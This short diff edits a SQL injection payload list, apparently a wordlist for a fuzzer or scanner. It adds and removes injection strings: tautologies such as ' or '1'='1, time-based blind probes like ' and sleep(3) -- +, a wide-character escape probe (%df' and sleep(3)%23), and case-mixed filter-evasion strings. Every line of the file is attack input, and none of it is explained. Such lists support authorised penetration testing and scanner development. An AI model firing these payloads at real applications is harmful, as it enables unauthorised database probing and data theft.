@@ -1,5 +1,4 @@
 %df' and sleep(3)%23
-' and '1'='1
 '
 "
 '''''
@@ -9,11 +8,20 @@
 \
 /*'*/
 /*!1111'*/
+%'aNd'1
+'lIke'
+-0
+,1
 ||1
-'||'asd'||'
+'||'1
 ' or '1'='1
  or 1=1
 ' or''='
-length(3)
-sleep(3)
-sleep(3
+and 1=1
+' and '1'='1
+and length(3) -- +
+' and length(3) -- +
+and sleep(3) -- +
+' and sleep(3)  -- +
+and sleep(3 -- +
+' and sleep(3 -- +
